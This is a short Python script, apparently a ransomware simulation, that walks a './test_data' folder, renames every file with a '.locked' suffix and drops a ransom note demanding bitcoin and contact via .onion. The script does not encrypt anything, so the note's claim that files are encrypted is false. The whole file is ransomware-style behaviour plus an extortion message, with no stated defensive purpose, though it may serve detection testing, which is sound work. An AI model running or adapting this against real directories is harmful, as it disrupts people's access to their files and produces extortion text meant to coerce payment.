import os

ROOT = "./test_data"

ransom_note = """Your files are encrypted.
Send bitcoin to xyz.
Contact us via .onion
"""

for root, dirs, files in os.walk(ROOT):
    for f in files:
        if not f.endswith(".locked"):
            os.rename(
                os.path.join(root, f),
                os.path.join(root, f + ".locked")
            )

with open(os.path.join(ROOT, "README_RESTORE_FILES.txt"), "w") as f:
    f.write(ransom_note)
